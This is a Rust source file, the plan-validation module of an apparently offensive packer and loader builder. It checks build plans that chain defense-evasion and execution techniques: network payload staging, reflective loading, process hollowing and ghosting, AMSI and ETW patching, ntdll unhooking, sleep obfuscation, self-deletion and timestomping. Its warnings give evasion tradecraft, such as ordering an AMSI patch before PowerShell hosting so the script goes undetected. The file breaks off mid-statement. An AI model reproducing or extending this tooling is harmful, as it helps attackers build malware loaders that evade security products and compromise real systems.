//! Semantic validation of the already-deserialized plan.
//!
//! Unlike parsing (which validates structure and types), here we check business
//! rules that cannot be expressed naturally with `serde`: empty values, invalid
//! combinations, supported architectures, the terminal-step rule, etc. The flat
//! `runtime:` list is resolved first ([`super::steps::resolve`]) so every rule
//! runs against concrete steps, with the payload each Execution step loads
//! pinned down.

use crate::engine::api_resolution::{ApiResolutionConfig, ApiResolutionMode, Unmatched};
use crate::engine::obfuscation::StringsConfig;
use crate::engine::polymorphism::PolymorphismMode;
use crate::engine::syscalls::{SyscallsConfig, SyscallsMode};
use crate::error::{PackerError, Result};
use crate::techniques::network_stager::{self, Downloader};
use crate::techniques::{Capability, RuntimeStep, Stability, TechniqueKind};

use super::schema::{Arch, DllEntry, OutputKind, PayloadFormat, Plan, StubPlan, Subsystem};
use super::steps::{self, ResolvedPayload, ResolvedStep};

/// Checks the business invariants of a [`Plan`].
///
/// The schema version is already validated during `Deserialize`, so here we
/// focus on semantic rules.
pub fn validate(plan: &Plan) -> Result<()> {
    if plan.name.trim().is_empty() {
        return Err(PackerError::Validation(
            "'name' must not be empty".to_string(),
        ));
    }

    if plan.build.output.path.as_os_str().is_empty() {
        return Err(PackerError::Validation(
            "'build.output.path' must not be empty".to_string(),
        ));
    }

    validate_sign(plan)?;
    validate_stub(&plan.build.stub)?;
    validate_polymorphism(plan)?;
    validate_syscalls_arch(plan)?;

    let steps = steps::resolve(plan)?;
    validate_terminal(&steps)?;
    validate_output(plan, &steps)?;
    validate_stager(plan, &steps)?;

    for step in &steps {
        if let Some(payload) = &step.payload {
            if payload.plan.source.trim().is_empty() {
                return Err(PackerError::Validation(format!(
                    "payload '{}' has an empty 'source'",
                    payload.name
                )));
            }
            // A `bouncer` decoy or a `drop` file is an inert asset, not a payload
            // to run, so it is validated as data (`format: plain`) instead of
            // against the technique's accepted execution formats.
            if is_embedded_asset(step) {
                validate_asset_payload(step, payload)?;
            } else {
                validate_payload_format(step, payload)?;
            }
            validate_payload_sha256(payload)?;
        }
        validate_bouncer(step)?;
        validate_drop(step)?;
        validate_guardrail(step)?;
        validate_self_deletion(step)?;
        validate_reflective_payload(step)?;
        validate_capabilities(plan, step)?;
        validate_sleep_obfuscation(step)?;
        validate_injection_target(plan, step)?;
    }

    validate_api_resolution(plan, &steps)?;
    validate_stack_spoofing(plan, &steps)?;

    Ok(())
}

/// Whether the step carries an embedded asset (a `bouncer` decoy or a `drop`
/// file): a Preparation step whose payload is data to write, not an Execution
/// payload to run.
fn is_embedded_asset(step: &ResolvedStep) -> bool {
    matches!(
        &step.technique,
        TechniqueKind::Bouncer { params } if params.is_decoy()
    ) || matches!(&step.technique, TechniqueKind::Drop { .. })
}

/// An embedded asset is inert data and must be `format: plain`.
///
/// No Execution technique accepts `plain` (its `formats` list is empty), so this
/// is also what stops a plan from accidentally running the asset bytes.
fn validate_asset_payload(step: &ResolvedStep, payload: &ResolvedPayload) -> Result<()> {
    if payload.plan.format != PayloadFormat::Plain {
        return Err(PackerError::Validation(format!(
            "step {} ('{}') asset payload '{}' is 'format: {}': a '{}' asset must be \
             'format: plain' (inert bytes the stub writes back out)",
            step.index,
            step.label,
            payload.name,
            payload.plan.format.label(),
            step.technique.name()
        )));
    }
    if payload.plan.export.is_some() {
        return Err(PackerError::Validation(format!(
            "asset payload '{}' declares 'export', which only applies to 'format: dll'",
            payload.name
        )));
    }
    Ok(())
}

/// Checks a `bouncer` configuration that `serde` cannot express.
///
/// The presence of `decoy.payload` (and its existence in `build.payloads`) is
/// already enforced by `steps::resolve`; the technique's own validation covers
/// the patterns, the CIDRs, the empty lists and the `on_reject` combinations.
fn validate_bouncer(step: &ResolvedStep) -> Result<()> {
    let TechniqueKind::Bouncer { params } = &step.technique else {
        return Ok(());
    };
    params.validate().map_err(|message| {
        PackerError::Validation(format!("step {} ('{}'): {message}", step.index, step.label))
    })
}

/// Checks a `drop` step's destination. `params.payload` is enforced by
/// `steps::resolve`; this covers the path.
fn validate_drop(step: &ResolvedStep) -> Result<()> {
    let TechniqueKind::Drop { params } = &step.technique else {
        return Ok(());
    };
    if params.path.trim().is_empty() {
        return Err(PackerError::Validation(format!(
            "step {} ('{}'): `params.path` must not be empty",
            step.index, step.label
        )));
    }
    Ok(())
}

/// Checks a `guardrail` step's gate parameters.
///
/// The stub compares `expire_on` lexicographically, so a date in any other shape
/// than `YYYY-MM-DD` silently disables the deadline; and the run counter is a
/// file named from `run_key` under the temporary directory, so a path-like value
/// could escape it and truncate an arbitrary file.
fn validate_guardrail(step: &ResolvedStep) -> Result<()> {
    let TechniqueKind::Guardrail { params } = &step.technique else {
        return Ok(());
    };
    if let Some(expire_on) = params.expire_on.as_deref() {
        if !is_iso_date(expire_on) {
            return Err(PackerError::Validation(format!(
                "step {} ('{}'): 'guardrail' `params.expire_on` '{expire_on}' is not a valid \
                 YYYY-MM-DD date; the stub compares it lexicographically, so another format would \
                 silently disable the deadline",
                step.index, step.label
            )));
        }
    }
    if params.run_key.trim().is_empty() {
        return Err(PackerError::Validation(format!(
            "step {} ('{}'): 'guardrail' `params.run_key` must not be empty",
            step.index, step.label
        )));
    }
    if params.run_key.contains(['\\', '/', ':'])
        || params.run_key.contains("..")
        || std::path::Path::new(&params.run_key).is_absolute()
    {
        return Err(PackerError::Validation(format!(
            "step {} ('{}'): 'guardrail' `params.run_key` '{key}' must be a plain file name: no \
             separators, drive/stream separator or '..' (it is joined to the temporary directory)",
            step.index,
            step.label,
            key = params.run_key
        )));
    }
    Ok(())
}

/// Whether `value` is exactly an ISO `YYYY-MM-DD` calendar date.
fn is_iso_date(value: &str) -> bool {
    let bytes = value.as_bytes();
    if bytes.len() != 10 || bytes[4] != b'-' || bytes[7] != b'-' {
        return false;
    }
    let number = |range: std::ops::Range<usize>| -> Option<u32> {
        let text = value.get(range)?;
        if !text.bytes().all(|b| b.is_ascii_digit()) {
            return None;
        }
        text.parse().ok()
    };
    let (Some(year), Some(month), Some(day)) = (number(0..4), number(5..7), number(8..10)) else {
        return false;
    };
    let leap = (year % 4 == 0 && year % 100 != 0) || year % 400 == 0;
    let last_day = match month {
        1 | 3 | 5 | 7 | 8 | 10 | 12 => 31,
        4 | 6 | 9 | 11 => 30,
        2 if leap => 29,
        2 => 28,
        _ => return false,
    };
    (1..=last_day).contains(&day)
}

/// Checks a `self_deletion` step's alternate data stream name.
///
/// The stub appends the stream to the running image's own path, so a value
/// without the leading `:` is not a stream at all, and a path separator or NUL
/// would address a different file (or truncate the name).
fn validate_self_deletion(step: &ResolvedStep) -> Result<()> {
    let TechniqueKind::SelfDeletion { params } = &step.technique else {
        return Ok(());
    };
    if params.mode != crate::techniques::self_deletion::Mode::RenameAds {
        return Ok(());
    }
    let Some(stream) = params.stream.as_deref() else {
        return Ok(());
    };
    let Some(name) = stream.strip_prefix(':') else {
        return Err(PackerError::Validation(format!(
            "step {} ('{}'): 'self_deletion' `params.stream` '{stream}' must start with ':' (it is \
             an alternate data stream name, not a path)",
            step.index, step.label
        )));
    };
    if name.is_empty() {
        return Err(PackerError::Validation(format!(
            "step {} ('{}'): 'self_deletion' `params.stream` '{stream}' names an empty stream",
            step.index, step.label
        )));
    }
    if stream.contains(['\\', '/', '\0']) {
        return Err(PackerError::Validation(format!(
            "step {} ('{}'): 'self_deletion' `params.stream` '{stream}' must not contain a path \
             separator or NUL",
            step.index, step.label
        )));
    }
    Ok(())
}

/// Checks a `reflective_loading` step's payload against what the technique
/// actually does with it.
///
/// `reflective_loading` maps an executable payload and calls its entry point; a
/// DLL's `DllMain` only initializes the library (a Picaro-packed inner DLL's
/// `DllMain` does nothing beyond `DisableThreadLibraryCalls`), so a `format: dll`
/// payload with no `export` maps the image and silently never starts the chain.
/// That is always a mistake: require the export the DLL exposes.
fn validate_reflective_payload(step: &ResolvedStep) -> Result<()> {
    if !matches!(&step.technique, TechniqueKind::ReflectiveLoading { .. }) {
        return Ok(());
    }
    let Some(payload) = &step.payload else {
        return Ok(());
    };
    if payload.plan.format == PayloadFormat::Dll && payload.plan.export.is_none() {
        return Err(PackerError::Validation(format!(
            "step {} ('{}') is 'reflective_loading' with a 'format: dll' payload ('{}') but the \
             payload sets no 'export': a mapped DLL's `DllMain` only initializes the library, so \
             the chain would never run — set 'build.payloads.{}.export' to the function the DLL \
             exposes, use an executable payload, or switch the payload to 'format: shellcode'",
            step.index, step.label, payload.name, payload.name
        )));
    }
    Ok(())
}

/// Checks `build.polymorphism`: the codegen pools must be non-degenerate.
///
/// The mode and seed are validated by `serde` on parse; this catches pool
/// values that would produce an invalid `rustc` invocation (`codegen-units: 0`,
/// an empty `opt-level`/`lto` pool).
fn validate_polymorphism(plan: &Plan) -> Result<()> {
    if let Some(polymorphism) = &plan.build.polymorphism {
        polymorphism.validate().map_err(PackerError::Validation)?;
    }
    Ok(())
}

/// The *terminal-step* rule.
///
/// `reflective_loading` of a PE executable and `dotnet_hosting` hand the whole
/// process to the payload (a normal `mainCRTStartup` calls `ExitProcess`), so
/// such a step can only be the last one — otherwise the following steps would
/// never run.
fn validate_terminal(steps: &[ResolvedStep]) -> Result<()> {
    for (position, step) in steps.iter().enumerate() {
        if position + 1 == steps.len() {
            break;
        }
        if let Some(technique) = terminal_technique(step) {
            return Err(PackerError::Validation(format!(
                "step {} ('{}') runs '{technique}', which does not return control to the loader, so \
                 the later step(s) would never run. Move it to the end of 'runtime:', or use \
                 'process_hollowing' (a separate process) or address it as a cooperative payload.",
                step.index, step.label
            )));
        }
    }
    Ok(())
}

/// The execution technique that makes a step terminal, if any.
///
/// `reflective_loading` is terminal only for a PE *executable* (`format: pe`): a
/// reflectively loaded DLL returns (its entry point is `DllMain`), and raw
/// shellcode returns if it is cooperative. `dotnet_hosting` hosts the CLR in the
/// stub's process, so a managed `Main` that exits ends the process.
fn terminal_technique(step: &ResolvedStep) -> Option<&'static str> {
    match &step.technique {
        TechniqueKind::DotnetHosting { .. } => Some("dotnet_hosting"),
        TechniqueKind::ReflectiveLoading { .. } | TechniqueKind::ProcessGhosting { .. } => {
            let format = step
                .payload
                .as_ref()
                .map_or(PayloadFormat::Pe, |payload| payload.plan.format);
            let technique = step.technique.name();
            (format == PayloadFormat::Pe).then_some(match technique {
                "process_ghosting" => "process_ghosting (a PE executable)",
                _ => "reflective_loading (a PE executable)",
            })
        }
        _ => None,
    }
}

/// Validates the `network_stager` steps: at most one, its payload must exist,
/// and the Execution step that runs it must come after it.
fn validate_stager(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
    let stagers: Vec<&ResolvedStep> = steps
        .iter()
        .filter(|step| matches!(step.technique, TechniqueKind::NetworkStager { .. }))
        .collect();

    if stagers.is_empty() {
        return Ok(());
    }
    if stagers.len() > 1 {
        return Err(PackerError::Validation(
            "only one 'network_stager' step is allowed per runtime (it fills a single slot)"
                .to_string(),
        ));
    }
    let stager = stagers[0];
    let (payload_name, url, downloader, crypto, key, nonce) = match &stager.technique {
        TechniqueKind::NetworkStager { params } => (
            params.payload.as_str(),
            params.url.as_str(),
            params.downloader,
            params.crypto,
            params.key.as_deref(),
            params.nonce.as_deref(),
        ),
        _ => unreachable!("filtered above"),
    };

    if payload_name.is_empty() {
        return Err(PackerError::Validation(format!(
            "step {} ('{}') must name a payload via 'params.payload'",
            stager.index, stager.label
        )));
    }
    if !plan.build.payloads.contains_key(payload_name) {
        return Err(PackerError::Validation(format!(
            "step {} ('{}') stages payload '{payload_name}', which is not declared in 'build.payloads'",
            stager.index, stager.label
        )));
    }

    let consumers: Vec<&ResolvedStep> = steps
        .iter()
        .filter(|step| step.is_execution())
        .filter(|step| {
            step.payload
                .as_ref()
                .map(|payload| payload.name == payload_name)
                .unwrap_or(false)
        })
        .collect();
    if consumers.len() != 1 {
        return Err(PackerError::Validation(format!(
            "step {} ('{}') stages payload '{payload_name}', which must be loaded by exactly one \
             Execution step (found {})",
            stager.index,
            stager.label,
            consumers.len()
        )));
    }
    if consumers[0].index < stager.index {
        return Err(PackerError::Validation(format!(
            "step {} ('{}') stages payload '{payload_name}', but the Execution step that runs it \
             is earlier in 'runtime:'",
            stager.index, stager.label
        )));
    }

    let known_schemes = ["http://", "https://", "ftp://", "scp://"];
    if !known_schemes.iter().any(|scheme| url.starts_with(scheme)) {
        return Err(PackerError::Validation(format!(
            "step {} ('{}') has an unsupported URL scheme in '{url}'; expected http://, \
             https://, ftp:// or scp://",
            stager.index, stager.label
        )));
    }

    // The in-process transport only speaks http(s); `auto` routes an http(s) URL
    // to it, so a URL it cannot parse is a build error for both.
    let scheme_is_http = url.starts_with("http://") || url.starts_with("https://");
    if downloader == Downloader::Winhttp && !scheme_is_http {
        return Err(PackerError::Validation(format!(
            "step {} ('{}') uses 'downloader: winhttp', which fetches in the loader's own process \
             and only supports http:// and https:// URLs; use 'auto' or a child-process downloader \
             for '{url}'",
            stager.index, stager.label
        )));
    }
    if scheme_is_http && matches!(downloader, Downloader::Auto | Downloader::Winhttp) {
        network_stager::parse_http_url(url).map_err(|e| {
            PackerError::Validation(format!("step {} ('{}'): {e}", stager.index, stager.label))
        })?;
    }

    if crypto.is_encrypted() {
        let valid_hex = |value: Option<&str>, bytes: usize| {
            value
                .map(|v| v.len() == bytes * 2 && v.bytes().all(|b| b.is_ascii_hexdigit()))
                .unwrap_or(false)
        };
        if !valid_hex(key, 32) || !valid_hex(nonce, 24) {
            return Err(PackerError::Validation(format!(
                "step {} ('{}') uses 'crypto: xchacha20poly1305' but 'key' (64 hex chars) and \
                 'nonce' (48 hex chars) are not both set",
                stager.index, stager.label
            )));
        }
    }

    Ok(())
}

/// Validates `build.output.kind`/`entry` and their couplings.
///
/// The chain, the techniques and the injected blocks are identical in both
/// modes; what changes is who owns the process. Everything a standalone
/// executable may do that a *host-loaded* DLL may not — kill the process, name
/// itself, carry a process-scoped manifest — is rejected here. See
/// `docs/design/dll-output.md` section 5.
fn validate_output(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
    let output = &plan.build.output;

    // A technique tied to one output kind must not appear under another.
    for step in steps {
        match &step.technique {
            TechniqueKind::PowershellHosting { .. } if output.kind != OutputKind::Exe => {
                return Err(PackerError::Validation(format!(
                    "step {} ('{}') is 'powershell_hosting' but build.output.kind is '{}': it runs a \
                     script in the loader's own process, which needs 'kind: exe'. For a module the \
                     operator imports, use 'import_powermodule' with 'kind: psmodule'",
                    step.index,
                    step.label,
                    output.kind.label()
                )));
            }
            TechniqueKind::ImportPowermodule { .. } if output.kind != OutputKind::PsModule => {
                return Err(PackerError::Validation(format!(
                    "step {} ('{}') is 'import_powermodule' but build.output.kind is '{}': it builds \
                     a managed PowerShell module, which needs 'kind: psmodule'",
                    step.index,
                    step.label,
                    output.kind.label()
                )));
            }
            _ => {}
        }
    }

    if output.kind == OutputKind::PsModule {
        return validate_psmodule(plan, steps);
    }

    if output.kind == OutputKind::Exe {
        if output.entry != DllEntry::Auto {
            return Err(PackerError::Validation(format!(
                "build.output.entry is '{}' but build.output.kind is 'exe': the entry only applies \
                 to a DLL; an executable starts at its `main`",
                output.entry.label()
            )));
        }
        return Ok(());
    }

    // A DLL and shellcode share the "runs inside a host" shape: the same
    // techniques that resolve or rewrite the *host's* image are wrong in both.
    validate_dll_like(plan, steps)?;

    match output.kind {
        OutputKind::Dll => validate_dll(plan)?,
        OutputKind::Shellcode => validate_shellcode(plan)?,
        _ => unreachable!("exe and psmodule returned before the host-shape checks"),
    }

    Ok(())
}

/// Constraints shared by `kind: dll` and `kind: shellcode`.
///
/// Both run the chain inside another process — a host that loaded the DLL with
/// the image loader, or one that ran the reflective shellcode — so every
/// technique that resolves or rewrites the running image hits the *host*, not
/// the artifact.
fn validate_dll_like(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
    let output = &plan.build.output;

    if output.subsystem == Subsystem::Windows {
        return Err(PackerError::Validation(format!(
            "build.output.subsystem is 'windows' but build.output.kind is '{}': a DLL has no \
             subsystem — the host process owns its own (and UAC/DPI awareness is per process)",
            output.kind.label()
        )));
    }

    if plan.build.stub.path.is_some() {
        return Err(PackerError::Validation(format!(
            "build.stub.path is set but build.output.kind is '{}': the custom-stub contract is a \
             `fn main()`, which a DLL does not have. Use the builtin stub (a `$ENTRY_BLOCK$` \
             contract is a documented extension, not implemented yet)",
            output.kind.label()
        )));
    }

    if let DllEntry::Export(name) = &output.entry {
        validate_export_name(name)?;
    }

    for step in steps {
        if matches!(&step.technique, TechniqueKind::SelfDeletion { .. }) {
            return Err(PackerError::Validation(format!(
                "step {} ('{}') is 'self_deletion' and build.output.kind is '{}': the technique \
                 resolves the *running image* (`GetModuleFileNameW(NULL)`), which in a DLL or \
                 shellcode build is the host — it would rename or delete the interpreter. A \
                 reflectively-mapped DLL cannot be deleted while it is loaded anyway",
                step.index,
                step.label,
                output.kind.label()
            )));
        }
        if matches!(&step.technique, TechniqueKind::SleepObfuscation { .. }) {
            return Err(PackerError::Validation(format!(
                "step {} ('{}') is 'sleep_obfuscation' and build.output.kind is '{}': the technique \
                 encrypts the *running image* (`GetModuleHandleA(NULL)` + `SizeOfImage`), which in \
                 a DLL or shellcode build is the host's image — the host's other threads keep \
                 running that code. It would also miss the payload, which lives in its own \
                 allocation outside the host image",
                step.index, step.label, output.kind.label()
            )));
        }
        if matches!(&step.technique, TechniqueKind::ErasePeHeader { .. }) {
            return Err(PackerError::Validation(format!(
                "step {} ('{}') is 'erase_pe_header' and build.output.kind is '{}': the technique \
                 zeroes the header at `GetModuleHandleA(NULL)`, which in a DLL or shellcode build \
                 is the *host's* image — it would erase the interpreter's PE header",
                step.index,
                step.label,
                output.kind.label()
            )));
        }
        if let TechniqueKind::Timestomping { params } = &step.technique {
            if params.target.is_none() {
                return Err(PackerError::Validation(format!(
                    "step {} ('{}') is 'timestomping' with no explicit `target` and \
                     build.output.kind is '{}': it resolves `std::env::current_exe()`, which in a \
                     DLL or shellcode build is the host executable. Set `params.target` to the file \
                     the step should stomp",
                    step.index,
                    step.label,
                    output.kind.label()
                )));
            }
        }
        if let TechniqueKind::Bouncer { params } = &step.technique {
            if params.on_reject.exits_process() {
                return Err(PackerError::Validation(format!(
                    "step {} ('{}') is 'bouncer' with an `on_reject` action that calls \
                     `std::process::exit` and build.output.kind is '{}': it would kill the host \
                     process. Use `action: abort`, or `action: decoy` with `exit_code: 0`",
                    step.index,
                    step.label,
                    output.kind.label()
                )));
            }
        }
    }

    Ok(())
}

/// Constraints specific to a host-loaded DLL that shellcode does not share.
fn validate_dll(plan: &Plan) -> Result<()> {
    let output = &plan.build.output;

    if output
        .resources
        .as_ref()
        .is_some_and(|resources| resources.manifest.is_some())
    {
        return Err(PackerError::Validation(
            "build.output.resources.manifest is set but build.output.kind is 'dll': an embedded \
             application manifest is process-scoped (UAC, DPI awareness) and a DLL cannot express \
             it — remove it for a DLL build"
                .to_string(),
        ));
    }

    Ok(())
}

/// Constraints specific to `kind: shellcode`.
fn validate_shellcode(plan: &Plan) -> Result<()> {
    let output = &plan.build.output;

    if output.sign.is_some() {
        return Err(PackerError::Validation(
            "build.output.sign is set but build.output.kind is 'shellcode': shellcode is not a PE, \
             so Authenticode signing does not apply — remove `sign`"
                .to_string(),
        ));
    }

    if output.resources.is_some() {
        return Err(PackerError::Validation(
            "build.output.resources is set but build.output.kind is 'shellcode': the DLL is mapped \
             reflectively and is absent from the loader's module list, so its resources cannot be \
             queried — remove `resources`"
                .to_string(),
        ));
    }

    if output.entry == DllEntry::JniOnLoad {
        return Err(PackerError::Validation(
            "build.output.entry is 'jni_on_load' but build.output.kind is 'shellcode': the \
             reflective loader calls the plain export after `DllMain`, and `jni_on_load` exports \
             only `JNI_OnLoad` — use `auto` or `export:<name>`"
                .to_string(),
        ));
    }

    if output.arch == Arch::X86 {
        return Err(PackerError::Validation(
            "build.output.kind is 'shellcode' with arch 'x86': the reflective loader calls the \
             export with the sRDI shape (two arguments, cdecl), but the entry's `extern \"system\"` \
             export is stdcall with four arguments on x86, so the stack unbalances. x86 shellcode \
             is parked until the entry has an sRDI-shaped export"
                .to_string(),
        ));
    }

    Ok(())
}

/// Validates a `build.output.kind: psmodule` build.
///
/// A PowerShell module is compiled from generated C# (not the Rust stub), runs
/// inside the operator's own `powershell.exe`, and only supports the techniques
/// that make sense there: `patch_amsi` (the host's AMSI) and `import_powermodule`
/// (one per script), plus `sleep`.
fn validate_psmodule(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
    let output = &plan.build.output;

    if output.subsystem == Subsystem::Windows {
        return Err(PackerError::Validation(
            "build.output.subsystem is 'windows' but build.output.kind is 'psmodule': the module \
             runs inside the operator's powershell.exe"
                .to_string(),
        ));
    }
    if output.resources.is_some() {
        return Err(PackerError::Validation(
            "build.output.resources is not embedded into a managed module yet; remove it for a \
             'kind: psmodule' build"
                .to_string(),
        ));
    }
    if plan.build.stub.path.is_some() {
        return Err(PackerError::Validation(
            "build.stub.path is set but build.output.kind is 'psmodule': the module is compiled \
             from generated C#, not the Rust stub"
                .to_string(),
        ));
    }

    let mut imports = 0usize;
    for step in steps {
        match &step.technique {
            TechniqueKind::ImportPowermodule { .. } => imports += 1,
            TechniqueKind::PatchAmsi { .. } | TechniqueKind::Sleep { .. } => {}
            other => {
                return Err(PackerError::Validation(format!(
                    "step {} ('{}') is '{}' and build.output.kind is 'psmodule': a module runs \
                     inside the operator's powershell.exe, where only 'patch_amsi', \
                     'import_powermodule' and 'sleep' are available",
                    step.index,
                    step.label,
                    other.name()
                )));
            }
        }
    }

    if imports == 0 {
        return Err(PackerError::Validation(
            "build.output.kind is 'psmodule' but no 'import_powermodule' step is declared"
                .to_string(),
        ));
    }

    Ok(())
}

/// The reserved and strict keywords of Rust 2021 plus the lone `_` wildcard.
///
/// `validate_export_name` accepts a C identifier; a keyword passes that check
/// and then fails `rustc` deep in the generated stub, so it is rejected here.
const RUST_KEYWORDS: &[&str] = &[
    "_", "abstract", "as", "async", "await", "become", "box", "break", "const", "continue",
    "crate", "do", "dyn", "else", "enum", "extern", "false", "final", "fn", "for", "gen", "if",
    "impl", "in", "let", "loop", "macro", "match", "mod", "move", "mut", "override", "priv", "pub",
    "ref", "return", "self", "Self", "static", "struct", "super", "trait", "true", "try", "type",
    "typeof", "unsafe", "unsized", "use", "virtual", "where", "while", "yield",
];

/// The plain export a `kind: dll` build declares must be a C identifier and must
/// not collide with the entry points the build itself emits.
fn validate_export_name(name: &str) -> Result<()> {
    if name.is_empty() {
        return Err(PackerError::Validation(
            "build.output.entry declares an empty export name (`export:`) — name the function hosts \
             will call, e.g. `export:Run`"
                .to_string(),
        ));
    }
    let starts_well = name
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_');
    if !starts_well || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        return Err(PackerError::Validation(format!(
            "build.output.entry export name '{name}' is not a valid function name; use letters, \
             digits and underscores, starting with a letter or an underscore"
        )));
    }
    if matches!(name, "DllMain" | "JNI_OnLoad") {
        return Err(PackerError::Validation(format!(
            "build.output.entry export name '{name}' collides with an entry point the build already \
             emits; pick another name"
        )));
    }
    if RUST_KEYWORDS.contains(&name) {
        return Err(PackerError::Validation(format!(
            "build.output.entry export name '{name}' is a Rust keyword; the generated stub would \
             not compile. Pick a plain identifier, e.g. `export:Run`"
        )));
    }
    Ok(())
}

/// Non-fatal advisories produced by validation.
///
/// These do not reject a plan (unlike [`validate`]); the build prints them as
/// warnings. Today they cover a `bouncer` gate with no check declared (a no-op,
/// almost certainly not intended), a `living_off_the_land` binary outside the
/// proxy-execution catalogue, the debug build, whose whole point is to trade
/// evasion for observability and whose artifact is therefore never for delivery,
/// and `api_resolution.unmatched: abort`, a strict allowlist that fails the load
/// on the first import outside the catalogue.
pub fn advisories(plan: &Plan) -> Vec<String> {
    let mut warnings = Vec::new();
    let steps = steps::resolve(plan).unwrap_or_default();
    let mut has_anti_debug = false;
    // `unhook_ntdll` restores ntdll's `.text` from a clean copy, so a `patch_etw`
    // step before it (which patches `EtwEventWrite`, also in ntdll's `.text`) is
    // silently undone. The order is the fix, so the warning names it.
    let mut patched_ntdll_text = false;
    // `powershell_hosting` drives the PowerShell engine, which scans every script
    // it compiles through AMSI: without an AMSI-neutralizing step before it
    // (`patch_amsi`, or `hardware_breakpoints` watching the scan exports) the
    // script is detected. The order is the fix, so the warning names it.
    let mut patched_amsi = false;
    // `image_path_spoofing` repoints the PEB `ImagePathName`, so a later step that
    // resolves the running image's own path (`self_deletion`, a `timestomping`
    // with no explicit target) would act on the decoy instead of the artifact.
    let mut image_path_spoofed = false;
    // `erase_pe_header` zeroes the loader's PE header, which `sleep_obfuscation`
    // reads (`SizeOfImage`) to size the region it encrypts: the order matters.
    let mut erased_header = false;
    // A technique that requires the indirect syscall layer (registry:
    // `requires_indirect_syscalls`) does nothing under `mode: none`.
    let indirect_active = SyscallsConfig::from_yaml(plan.build.stub.syscalls.as_ref())
        .map(|config| config.mode == SyscallsMode::Indirect)
        .unwrap_or(false);

    // A debug build forces `mode: none` (`src/main.rs`), so a plan that asks for
    // polymorphism and is built with `build.stub.debug: true` gets none.
    if plan.build.stub.debug {
        if let Some(polymorphism) = &plan.build.polymorphism {
            if polymorphism.mode != PolymorphismMode::None {
                warnings.push(
                    "build.stub.debug is true: polymorphism is disabled for debug builds (their \
                     output must stay reproducible), so build.polymorphism is ignored"
                        .to_string(),
                );
            }
        }
    }

    for step in &steps {
        match &step.technique {
            TechniqueKind::Bouncer { params } if params.is_noop() => {
                warnings.push(
                    "bouncer: neither `require`/`any_of` nor `anti_analysis` declares a check, so \
                     the technique is a no-op and will never abort the pipeline"
                        .to_string(),
                );
            }
            TechniqueKind::PatchEtw { .. } => patched_ntdll_text = true,
            TechniqueKind::PatchAmsi { .. } => patched_amsi = true,
            // A `hardware_breakpoints` step that watches the AMSI scan exports
            // neutralizes AMSI too, so it satisfies the same requirement.
            TechniqueKind::HardwareBreakpoints { params } if params.amsi => patched_amsi = true,
            TechniqueKind::PowershellHosting { .. } if !patched_amsi => {
                warnings.push(format!(
                    "step {}: 'powershell_hosting' runs the script through the PowerShell engine, \
                     which AMSI-scans it; add a 'patch_amsi' (or a 'hardware_breakpoints') step \
                     before it or the script will be detected",
                    step.index
                ));
            }
            TechniqueKind::UnhookNtdll { .. } if patched_ntdll_text => {
                warnings.push(format!(
                    "step {}: 'unhook_ntdll' restores ntdll's .text from disk, which undoes the \
                     'patch_etw' step before it; put 'unhook_ntdll' first",
                    step.index
                ));
            }
            TechniqueKind::LivingOffTheLand { params } => {
                if !steps::is_known_lolbin(&params.binary) {
                    warnings.push(format!(
                        "step {}: '{}' is not a known living-off-the-land binary; the step still \
                         runs it, but a signed system binary (certutil, rundll32, ...) is the \
                         usual choice for proxy execution",
                        step.index, params.binary
                    ));
                }
            }
            TechniqueKind::AntiDebug { .. } => has_anti_debug = true,
            TechniqueKind::ImagePathSpoofing { .. } => image_path_spoofed = true,
            TechniqueKind::ErasePeHeader { .. } => erased_header = true,
            TechniqueKind::SleepObfuscation { .. } if erased_header => {
                warnings.push(format!(
                    "step {}: 'sleep_obfuscation' reads `SizeOfImage` from the loader's PE header, \
                     which an earlier 'erase_pe_header' step zeroed, so it cannot size the region it \
                     encrypts — run 'sleep_obfuscation' before 'erase_pe_header'",
                    step.index
                ));
            }
            TechniqueKind::Timestomping { params }
                if image_path_spoofed && params.target.is_none() =>
            {
                warnings.push(format!(
                    "step {}: 'timestomping' has no explicit `target`, so it resolves the running \
                     image's path at run time; an earlier 'image_path_spoofing' step repointed that \
                     path in the PEB, so the stomp would hit the decoy — set an explicit `target` or \
                     run the timestomp first",
                    step.index
                ));
            }
            TechniqueKind::SelfDeletion { .. } if image_path_spoofed => {
                warnings.push(format!(
                    "step {}: 'self_deletion' resolves the running image's own path, which an earlier \
                     'image_path_spoofing' step repointed in the PEB, so it would act on the decoy",
                    step.index
                ));
            }
            _ => {}
        }
    }

    // A technique the registry marks as not finished must be visible at build
    // time: the artifact would be missing part of (or all of) the work the plan
    // asks for, and nothing else in the build says so.
    for step in &steps {
        if let Some(def) = crate::techniques::find(step.technique.name()) {
            if def.stability == Stability::Unimplemented {
                warnings.push(format!(
                    "step {}: technique '{}' is marked 'unimplemented' in the registry — its \
                     implementation is not finished, so the artifact will not do everything the \
                     plan asks for",
                    step.index, def.name
                ));
            }
            // e.g. `stack_spoofing` rewrites the trampoline only the indirect
            // layer emits; under `mode: none` that trampoline does not exist, so
            // the technique silently does nothing.
            if def.requires_indirect_syscalls && !indirect_active {
                warnings.push(format!(
                    "step {}: '{}' only affects the indirect syscall layer, but \
                     build.stub.syscalls.mode is not 'indirect' (or the runtime uses no syscalls at \
                     all), so it is a no-op",
                    step.index, def.name
                ));
            }
        }
    }

    if plan.build.stub.debug {
        warnings.push(
            "build.stub.debug is enabled: the artifact prints technique traces and is built \
             without symbol stripping, path trimming or optimization; it is a lab artifact and \
             must not be delivered"
                .to_string(),
        );
        if has_anti_debug {
            warnings.push(
                "build.stub.debug is enabled but `anti_debug` is in the runtime: it may abort \
                 the stub under the very debugger you are using"
                    .to_string(),
            );
        }
    }

    if let Ok(config) = ApiResolutionConfig::from_yaml(plan.build.stub.api_resolution.as_ref()) {
        if config.mode == ApiResolutionMode::Proxy && config.is_noop() {
            warnings.push(
                "build.stub.api_resolution.mode is 'proxy' but no 'apis' are declared, so it is a \
                 no-op"
                    .to_string(),
            );
        }
        if config.mode == ApiResolutionMode::Proxy && config.unmatched == Unmatched::Abort {
            warnings.push(
                "build.stub.api_resolution.unmatched is 'abort': the loader will fail on any \
                 payload import outside the catalogue (a strict allowlist / debugging posture)"
                    .to_string(),
            );
        }
        if config.hooks.sleep.is_some() {
            warnings.push(
